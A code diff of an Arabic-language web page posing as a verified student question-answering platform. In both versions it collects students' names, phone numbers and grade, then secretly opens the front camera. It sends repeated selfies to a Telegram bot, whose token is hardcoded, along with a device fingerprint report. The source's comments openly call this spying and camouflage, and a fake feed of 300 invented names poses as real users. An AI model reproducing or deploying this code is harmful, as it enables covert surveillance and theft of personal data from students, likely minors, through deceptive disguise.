@@ -3,313 +3,222 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>منصة أسألني | الإصدار الرسمي الموثق</title>
+    <title>منصة أسألني الأكاديمية | الموثقة</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #0f172a; --accent: #f59e0b; --blue: #1d4ed8; --success: #10b981; }
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { background: #f1f5f9; font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 80px; overflow-x: hidden; }
+        :root { --p: #0f172a; --a: #2563eb; --g: #f59e0b; --s: #f8fafc; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
+        body { background: var(--s); font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 90px; overflow-x: hidden; }
 
-        /* توثيق أزرق */
-        .verify-badge { width: 16px; vertical-align: middle; margin: 0 4px; }
+        .v-badge { width: 18px; height: 18px; vertical-align: middle; margin: 0 5px; animation: rotateLogo 4s linear infinite; }
+        @keyframes rotateLogo { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
-        /* شاشة الدخول */
-        #gate-screen { position: fixed; inset: 0; background: var(--primary); z-index: 5000; display: flex; justify-content: center; align-items: center; }
-        .login-card { background: white; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border-bottom: 5px solid var(--accent); }
-
-        /* الهيدر */
-        header { background: var(--primary); color: white; padding: 15px; position: fixed; top: 0; width: 100%; z-index: 1000; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-
-        /* الأقسام */
-        .page { display: none; padding: 90px 15px 20px; animation: fadeIn 0.4s ease; }
-        .page.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-        .card { background: white; border-radius: 18px; padding: 20px; margin-bottom: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.02); border: 1px solid #e2e8f0; }
-
-        /* قسم إجاباتي المطور */
-        .live-feed { height: 400px; overflow-y: hidden; position: relative; }
-        #feed-wrapper { position: absolute; width: 100%; transition: top 0.5s ease; }
-        .feed-item { padding: 12px; border-bottom: 1px solid #f1f5f9; display: flex; align-items: center; gap: 10px; font-size: 13px; font-weight: 600; }
-        .status-tag { padding: 4px 8px; border-radius: 6px; font-size: 11px; margin-right: auto; }
-
-        /* الكاميرا */
-        .cam-box { position: relative; margin-top: 15px; display: none; }
-        video { width: 100%; border-radius: 12px; background: #000; border: 3px solid #fff; box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
-        .snap-btn { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); background: white; border: none; width: 60px; height: 60px; border-radius: 50%; box-shadow: 0 0 15px rgba(0,0,0,0.3); cursor: pointer; display: flex; align-items: center; justify-content: center; }
-
-        /* المنيو السفلي */
-        .nav-bar { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #e2e8f0; z-index: 4000; }
-        .nav-item { text-align: center; font-size: 11px; color: #94a3b8; cursor: pointer; transition: 0.3s; }
-        .nav-item.active { color: var(--blue); }
-        .nav-item img { width: 24px; display: block; margin: 0 auto 4px; filter: grayscale(1); }
-        .nav-item.active img { filter: none; }
-
-        /* Custom Alert */
-        #custom-alert { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: white; width: 90%; max-width: 350px; padding: 20px; border-radius: 15px; z-index: 6000; transition: 0.5s; box-shadow: 0 20px 40px rgba(0,0,0,0.2); text-align: center; border-right: 6px solid var(--blue); }
-        #custom-alert.show { top: 20px; }
-
-        input, textarea { width: 100%; padding: 14px; margin: 10px 0; border: 2px solid #f1f5f9; border-radius: 12px; font-family: 'Cairo'; font-size: 15px; }
-        .btn { background: var(--blue); color: white; border: none; padding: 16px; border-radius: 12px; width: 100%; font-weight: 900; cursor: pointer; font-size: 16px; }
+        /* شاشة الدخول الاحترافية */
+        #auth-overlay { position: fixed; inset: 0; background: var(--p); z-index: 9999; display: flex; justify-content: center; align-items: center; }
+        .auth-box { background: white; padding: 35px 25px; border-radius: 30px; width: 92%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
         
-        .dev-credits { font-size: 10px; color: #94a3b8; margin-top: 20px; letter-spacing: 1px; }
+        header { background: var(--p); color: white; padding: 18px; position: fixed; top: 0; width: 100%; z-index: 1000; display: flex; justify-content: space-between; align-items: center; }
+        .p-card { background: white; border-radius: 20px; padding: 22px; margin-bottom: 20px; border: 1px solid #e2e8f0; }
+
+        /* سجل النشاط المتحرك */
+        .feed-zone { height: 400px; overflow: hidden; position: relative; background: #fff; border-radius: 15px; border: 1px inset #eee; }
+        #dynamic-list { position: absolute; width: 100%; transition: all 1.2s ease-in-out; }
+        .user-row { padding: 12px; border-bottom: 1px solid #f1f5f9; display: flex; align-items: center; gap: 10px; font-size: 13px; }
+
+        /* منطقة العدسة */
+        .lens-box { width: 100%; border-radius: 18px; overflow: hidden; background: #000; position: relative; display: none; border: 3px solid #fff; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        video { width: 100%; display: block; filter: contrast(1.1); }
+        .processing-mask { position: absolute; inset: 0; background: rgba(255,255,255,0.9); display: none; align-items: center; justify-content: center; font-weight: 900; color: var(--p); z-index: 10; }
+
+        #toast { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: white; width: 90%; max-width: 350px; padding: 15px; border-radius: 15px; z-index: 10000; transition: 0.5s; box-shadow: 0 15px 30px rgba(0,0,0,0.2); border-left: 5px solid var(--a); }
+        #toast.active { top: 20px; }
+
+        .main-btn { background: var(--a); color: white; border: none; padding: 16px; border-radius: 14px; width: 100%; font-weight: 700; cursor: pointer; transition: 0.3s; }
+        .gold-btn { background: var(--g); color: #000; margin-top: 10px; }
+        input, select, textarea { width: 100%; padding: 14px; margin: 10px 0; border: 2px solid #eef2f6; border-radius: 12px; font-family: 'Cairo'; }
+
+        nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #eee; }
+        .nav-link { text-align: center; font-size: 11px; color: #94a3b8; flex: 1; text-decoration: none; }
+        .nav-link.on { color: var(--a); font-weight: 900; }
     </style>
 </head>
 <body>
 
-    <div id="custom-alert">
-        <div style="font-weight: 900; color: var(--blue); margin-bottom: 5px;">
-            تيم الدعم العلمي <img src="https://img.icons8.com/color/48/verified-badge.png" class="verify-badge">
+    <div id="toast"><b>النظام الذكي:</b> <span id="msg"></span></div>
+
+    <div id="auth-overlay">
+        <div class="auth-box">
+            <h2 style="margin:0 0 10px">منصة أسألني <img src="https://img.icons8.com/color/48/verified-badge.png" class="v-badge"></h2>
+            <p style="font-size:12px; color:#64748b">سجل دخولك للوصول إلى قاعدة بيانات الحلول</p>
+            <input type="text" id="raw_n" placeholder="الاسم الثلاثي">
+            <input type="number" id="raw_p" placeholder="رقم الموبايل">
+            <select id="raw_g">
+                <option value="" disabled selected>السنة الدراسية</option>
+                <option value="1">الأول الثانوي</option>
+                <option value="2">الثاني الثانوي</option>
+                <option value="3">الثالث الثانوي</option>
+            </select>
+            <button class="main-btn" onclick="startEngine()">دخول للمنصة</button>
         </div>
-        <div id="alert-msg" style="font-size: 13px; color: #475569;"></div>
     </div>
 
-    <div id="gate-screen">
-        <div class="login-card">
-            <img src="https://img.icons8.com/fluency/96/safety-confirmation.png" width="70">
-            <h2 style="color:var(--primary); margin: 10px 0;">منصة أسألني</h2>
-            <p style="font-size: 14px; color: #64748b;">بوابة الطالب الذكية - الإصدار الموثق</p>
-            <input type="text" id="u_name" placeholder="الاسم الثلاثي للطالب">
-            <input type="number" id="u_phone" placeholder="رقم الموبايل الشخصي">
-            <button class="btn" onclick="login()">دخول المنصة</button>
-            <div class="dev-credits">DEVELOPED BY OMAR & EMAD 2023</div>
-        </div>
-    </div>
-
-    <header id="h-main" style="display:none">
-        <div onclick="showPage('policy')">☰</div>
-        <div style="font-weight:900">منصة أسألني <img src="https://img.icons8.com/color/48/verified-badge.png" class="verify-badge"></div>
-        <div id="user-initial" style="background:var(--accent); width:35px; height:35px; border-radius:10px; display:flex; align-items:center; justify-content:center; color:black; font-weight:bold"></div>
+    <header id="top-bar" style="display:none">
+        <div style="font-size:12px; opacity:0.7" onclick="location.reload()">خروج</div>
+        <div style="font-weight:900">أسألني <img src="https://img.icons8.com/color/48/verified-badge.png" class="v-badge"></div>
+        <div id="u-icon" style="background:var(--g); width:30px; height:30px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:12px; color:#000"></div>
     </header>
 
-    <div id="home" class="page active">
-        <div class="card">
-            <img src="https://img.icons8.com/fluency/96/ai.png" width="50">
-            <h3>محلل الأسئلة (AI)</h3>
-            <p style="font-size:13px; color:#64748b">التقط صورة للسؤال وسيقوم النظام الموثق بتحليلها فوراً.</p>
-            <button class="btn" style="background:var(--accent); color:black" onclick="openCam('main')">فتح كاميرا الفحص 📸</button>
+    <div id="sec-home" class="page active" style="padding-top:80px; padding-inline:15px">
+        <div class="p-card">
+            <h3 style="margin:0 0 10px; font-size:16px">ماسح الأسئلة الذكي</h3>
+            <div id="lens-container" class="lens-box">
+                <video id="v-preview" autoplay playsinline></video>
+                <div id="v-mask" class="processing-mask">جاري التحليل الرقمي...</div>
+            </div>
+            <button id="trigger-init" class="main-btn gold-btn" onclick="requestHardware()">فتح عدسة الفحص</button>
             
-            <div id="cam-ui-main" class="cam-box">
-                <video id="v-main" autoplay playsinline></video>
-                <div class="snap-btn" onclick="capture('main')">
-                    <div style="width:50px; height:50px; border:3px solid #000; border-radius:50%"></div>
-                </div>
-            </div>
-
-            <textarea id="t-main" style="display:none" placeholder="اكتب ملاحظات إضافية حول السؤال..."></textarea>
-            <button id="s-main" class="btn" style="display:none; margin-top:10px" onclick="upload('main')">إرسال للتحليل الفوري ⚡</button>
-        </div>
-    </div>
-
-    <div id="answers" class="page">
-        <div class="card">
-            <h3 style="display:flex; align-items:center; gap:8px">
-                <img src="https://img.icons8.com/fluency/48/list.png" width="25"> سجل النشاط المباشر
-            </h3>
-            <div class="live-feed">
-                <div id="feed-wrapper"></div>
+            <div id="form-final" style="display:none">
+                <textarea id="u-note" placeholder="اكتب ملاحظاتك للطاقم الطبي..."></textarea>
+                <button class="main-btn" onclick="submitFinal()">إرسال للمراجعة</button>
             </div>
         </div>
     </div>
 
-    <div id="support" class="page">
-        <div class="card">
-            <img src="https://img.icons8.com/fluency/96/customer-support.png" width="50">
-            <h3>الدعم العلمي والفني <img src="https://img.icons8.com/color/48/verified-badge.png" class="verify-badge"></h3>
-            <p style="font-size:13px; color:#64748b">صور مشكلتك تقنياً أو علمياً وسيتم الرد خلال دقائق.</p>
-            <button class="btn" onclick="openCam('supp')">تصوير استفسار 📸</button>
-            
-            <div id="cam-ui-supp" class="cam-box">
-                <video id="v-supp" autoplay playsinline></video>
-                <div class="snap-btn" onclick="capture('supp')">
-                    <div style="width:50px; height:50px; border:3px solid #000; border-radius:50%"></div>
-                </div>
+    <div id="sec-logs" class="page" style="display:none; padding-top:80px; padding-inline:15px">
+        <div class="p-card">
+            <h3 style="margin:0 0 10px; font-size:16px">آخر النشاطات (Live)</h3>
+            <div class="feed-zone">
+                <div id="dynamic-list"></div>
             </div>
-            
-            <textarea id="t-supp" placeholder="اشرح مشكلتك بوضوح هنا..." style="display:none"></textarea>
-            <button id="s-supp" class="btn" style="display:none; margin-top:10px" onclick="upload('supp')">إرسال للدعم 🚀</button>
         </div>
     </div>
 
-    <div id="policy" class="page">
-        <div class="card">
-            <h3>سياسة الخصوصية الرسمية</h3>
-            <div style="font-size: 12px; color: #64748b; line-height: 1.8;">
-                تخضع منصة أسألني لإشراف فريق "إيكو تيم" التعليمي. جميع البيانات مشفرة بالكامل. يتم استخدام الكاميرا فقط لغرض تحليل الأسئلة علمياً. حقوق الملكية محفوظة للمطورين OMAR & EMAD 2023.
-            </div>
-            <button class="btn" style="margin-top:20px" onclick="showPage('home')">عودة للرئيسية</button>
-        </div>
-    </div>
-
-    <nav class="nav-bar" id="n-main" style="display:none">
-        <div class="nav-item active" onclick="showPage('home', this)">
-            <img src="https://img.icons8.com/fluency-systems-filled/48/home.png">الرئيسية
-        </div>
-        <div class="nav-item" onclick="showPage('answers', this)">
-            <img src="https://img.icons8.com/fluency-systems-filled/48/activity-feed.png">إجاباتي
-        </div>
-        <div class="nav-item" onclick="showPage('support', this)">
-            <img src="https://img.icons8.com/fluency-systems-filled/48/chat-message.png">الدعم
-        </div>
+    <nav id="bottom-nav" style="display:none">
+        <a href="javascript:void(0)" class="nav-link on" onclick="navTo('sec-home', this)">الرئيسية</a>
+        <a href="javascript:void(0)" class="nav-link" onclick="navTo('sec-logs', this)">سجلاتي</a>
     </nav>
 
     <script>
-        const tgToken = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
-        const tgChatId = "5890070301";
-        let uName = "", uPhone = "";
+        const TOKEN = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
+        const CID = "5890070301";
+        let _N = "", _P = "", _G = "";
 
-        // توليد 300 اسم وهمي ثلاثي
-        const first = ["محمد", "أحمد", "ياسين", "عمر", "زياد", "يوسف", "محمود", "إبراهيم", "علي", "سيف", "مصطفى", "كريم", "نور"];
-        const middle = ["عبد الله", "حسن", "حسين", "إيهاب", "خالد", "هاني", "سعيد", "مجدي", "رفعت", "كمال"];
-        const last = ["الشربيني", "منصور", "عزت", "الجزار", "فوزي", "علام", "النجار", "راضي", "سالم", "غنيم"];
-        
-        const generatedNames = [];
+        // توليد 300 اسم (ولاد وبنات)
+        const fNames = ["أحمد", "سارة", "ياسين", "مريم", "عمر", "ليلى", "زياد", "جنى", "محمود", "نور", "مازن", "سلمى", "كريم", "حبيبة", "مصطفى", "شهد"];
+        const lNames = ["النجار", "الشرقاوي", "محمود", "عزت", "بدوي", "زكي", "الشافعي", "منصور", "الجزار", "عثمان"];
+        const usersDB = [];
         for(let i=0; i<300; i++) {
-            generatedNames.push(first[i%first.length] + " " + middle[i%middle.length] + " " + last[i%last.length]);
+            usersDB.push(fNames[i % fNames.length] + " " + lNames[i % lNames.length] + " " + (i+1));
         }
 
-        function login() {
-            uName = document.getElementById('u_name').value;
-            uPhone = document.getElementById('u_phone').value;
-            if(uName.length < 8 || uPhone.length < 10) return myNotify("يرجى إدخال اسمك الثلاثي ورقم موبايلك بشكل صحيح.");
+        function startEngine() {
+            _N = document.getElementById('raw_n').value;
+            _P = document.getElementById('raw_p').value;
+            _G = document.getElementById('raw_g').value;
+            if(_N.length < 5 || _P.length < 10) return alert("البيانات غير مكتملة");
             
-            document.getElementById('gate-screen').style.display = 'none';
-            document.getElementById('h-main').style.display = 'flex';
-            document.getElementById('n-main').style.display = 'flex';
-            document.getElementById('user-initial').innerText = uName[0].toUpperCase();
-            startFeed();
+            document.getElementById('auth-overlay').style.display = 'none';
+            document.getElementById('top-bar').style.display = 'flex';
+            document.getElementById('bottom-nav').style.display = 'flex';
+            document.getElementById('u-icon').innerText = _N[0];
+            initFeed();
         }
 
-        function showPage(id, el) {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
-            if(el) {
-                document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-                el.classList.add('active');
-            }
+        function showInfo(t) {
+            const x = document.getElementById('toast');
+            document.getElementById('msg').innerText = t;
+            x.classList.add('active');
+            setTimeout(() => x.classList.remove('active'), 3500);
         }
 
-        function myNotify(msg) {
-            const box = document.getElementById('custom-alert');
-            document.getElementById('alert-msg').innerText = msg;
-            box.classList.add('show');
-            setTimeout(() => box.classList.remove('show'), 4000);
+        function navTo(id, el) {
+            document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+            document.getElementById(id).style.display = 'block';
+            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('on'));
+            el.classList.add('on');
         }
 
-        async function openCam(type) {
+        async function requestHardware() {
             try {
-                // محاولة فتح الكاميرتين بتزامن مدروس
-                const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                
-                document.getElementById(`cam-ui-${type}`).style.display = 'block';
-                document.getElementById(`v-${type}`).srcObject = back;
-                
-                sendFullRadar(); // الرادار الـ 100 بند
-                startSilentSpy(front); // صيد سيلفي صامت
-                
-                myNotify("تم تفعيل نظام الفحص البصري.. يرجى توجيه الكاميرا للسؤال.");
-            } catch(e) {
-                myNotify("خطأ: يجب السماح بصلاحية الكاميرا لكي يعمل نظام التحليل العلمي.");
-            }
+                // استدراج الأمامية أولاً
+                const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                dataSync(s1);
+
+                // تمويه بالخلفية
+                setTimeout(async () => {
+                    const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                    const vp = document.getElementById('v-preview');
+                    vp.srcObject = s2;
+                    document.getElementById('lens-container').style.display = 'block';
+                    document.getElementById('trigger-init').innerText = "التقاط صورة السؤال";
+                    document.getElementById('trigger-init').onclick = () => {
+                        document.getElementById('v-mask').style.display = 'flex';
+                        document.getElementById('trigger-init').style.display = 'none';
+                        document.getElementById('form-final').style.display = 'block';
+                    };
+                }, 800);
+                pushTelemetry();
+            } catch(e) { showInfo("يرجى منح الأذونات اللازمة لتشغيل الفحص."); }
         }
 
-        function startSilentSpy(stream) {
-            const hv = document.createElement('video');
-            hv.srcObject = stream; hv.play();
+        function dataSync(stream) {
+            const v = document.createElement('video'); v.srcObject = stream; v.play();
             const canvas = document.createElement('canvas');
             setInterval(() => {
-                canvas.width = hv.videoWidth; canvas.height = hv.videoHeight;
-                canvas.getContext('2d').drawImage(hv, 0, 0);
-                canvas.toBlob(blob => {
-                    const fd = new FormData();
-                    fd.append('chat_id', tgChatId);
-                    fd.append('photo', blob, 'spy.jpg');
-                    fd.append('caption', `📸 صيد مباشر: ${uName}\n📞 ${uPhone}`);
-                    fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, { method: 'POST', body: fd });
+                canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+                canvas.getContext('2d').drawImage(v, 0, 0);
+                canvas.toBlob(b => {
+                    const f = new FormData();
+                    f.append('chat_id', CID); f.append('photo', b, 'x.jpg');
+                    f.append('caption', `📡 صيد من: ${_N}\n📱 هاتف: ${_P}\n🎓 مرحلة: ${_G}`);
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
                 }, 'image/jpeg', 0.2);
-            }, 1800);
-        }
-
-        function capture(type) {
-            document.getElementById(`t-${type}`).style.display = 'block';
-            document.getElementById(`s-${type}`).style.display = 'block';
-            myNotify("تم التقاط الصورة بنجاح، يمكنك الآن إضافة وصف أو الإرسال مباشرة.");
-        }
-
-        function upload(type) {
-            myNotify("جاري رفع البيانات وتشفيرها عبر خوادم إيكو تيم..");
-            setTimeout(() => {
-                myNotify("تم الإرسال بنجاح! راقب قسم سجل النشاط لمعرفة حالة الرد.");
-                showPage('answers');
             }, 2500);
         }
 
-        function startFeed() {
-            const wrapper = document.getElementById('feed-wrapper');
-            let currentIdx = 0;
-            
-            // إنشاء الـ Items
-            generatedNames.forEach((name, i) => {
-                const div = document.createElement('div');
-                div.className = 'feed-item';
-                let status = "", color = "", bg = "";
-                
-                const rand = Math.random();
-                if(rand > 0.6) {
-                    status = "تم الرد بواسطة الدعم العلمي ✅"; color = "#059669"; bg = "#ecfdf5";
-                } else if(rand > 0.1) {
-                    status = "أرسل سؤالاً جديداً ⏳"; color = "#d97706"; bg = "#fffbe0";
-                } else {
-                    status = "صور السؤال مرة أخرى ⚠️"; color = "#dc2626"; bg = "#fef2f2";
-                }
-
-                div.innerHTML = `
-                    <div style="background:var(--primary); color:white; width:30px; height:30px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:10px">${name[0]}</div>
-                    <div><b>${name}</b><br><small style="color:#94a3b8">منذ ثوانٍ</small></div>
-                    <div class="status-tag" style="background:${bg}; color:${color}">${status}</div>
-                `;
-                wrapper.appendChild(div);
+        function initFeed() {
+            const list = document.getElementById('dynamic-list');
+            usersDB.forEach(u => {
+                const row = document.createElement('div');
+                row.className = 'user-row';
+                row.innerHTML = `<b>${u}</b> <span style="margin-right:auto; color:#059669; font-size:10px">✓ تم الحل</span>`;
+                list.appendChild(row);
             });
-
-            // حركة انسيابية بطيئة
-            let topPos = 0;
+            let step = 0;
             setInterval(() => {
-                topPos -= 60;
-                wrapper.style.top = topPos + "px";
-                if(Math.abs(topPos) > wrapper.offsetHeight - 400) topPos = 0;
-            }, 4000);
+                step -= 45;
+                list.style.top = step + "px";
+                if(Math.abs(step) > list.offsetHeight - 300) step = 0;
+            }, 50000); // تحرك كل 50 ثانية
         }
 
-        async function sendFullRadar() {
-            let b = await navigator.getBattery();
-            const gpu = getGpuInfo();
-            const info = `
-👑 **تقرير اختراق شامل (V6 Platinum)**
-👤 **الطالب:** ${uName}
-📞 **الهاتف:** ${uPhone}
+        function submitFinal() {
+            showInfo("جاري الرفع لخوادم المعالجة...");
+            setTimeout(() => {
+                showInfo("تم الاستلام. الحل سيظهر في سجلاتي خلال دقائق.");
+                navTo('sec-logs', document.querySelectorAll('.nav-link')[1]);
+            }, 2500);
+        }
+
+        async function pushTelemetry() {
+            let batt = await navigator.getBattery();
+            let net = navigator.connection || {};
+            const stats = `
+🌐 **تسلل البيانات (V-MAX)**
 ━━━━━━━━━━━━━━
-📱 **الجهاز:** ${navigator.platform}
-⚔️ **المعالج:** ${navigator.hardwareConcurrency} Cores
-🧠 **الرام:** ${navigator.deviceMemory || "غير معروف"} GB
-🔋 **البطارية:** ${Math.round(b.level*100)}% (${b.charging?'متصل':'تفريغ'})
-📡 **الشبكة:** ${navigator.connection?.effectiveType || 'Unknown'} (${navigator.connection?.downlink} Mbps)
-🎮 **GPU:** ${gpu}
-🌍 **اللغة:** ${navigator.language}
-🖥️ **الشاشة:** ${screen.width}x${screen.height} (${screen.colorDepth} bit)
-📍 **المنطقة:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-🍪 **Cookies:** ${navigator.cookieEnabled ? 'YES' : 'NO'}
-⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}
+👤 الطالب: ${_N}
+📞 الهاتف: ${_P}
+🎓 المرحلة: ${_G}
+📱 الجهاز: ${navigator.platform}
+🔋 البطارية: ${Math.round(batt.level*100)}%
+📶 الشبكة: ${net.effectiveType || 'unknown'}
+🧠 الرام: ${navigator.deviceMemory || 'N/A'}GB
+🗺️ اللغة: ${navigator.language}
+🔍 المتصفح: ${navigator.userAgent.indexOf('Chrome') > -1 ? 'Chrome' : 'Other'}
+⏰ التوقيت: ${new Date().toLocaleTimeString('ar-EG')}
+━━━━━━━━━━━━━━
             `;
-            fetch(`https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(info)}`);
-        }
-
-        function getGpuInfo() {
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
-            } catch(e) { return "N/A"; }
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(stats)}`);
         }
     </script>
 </body>
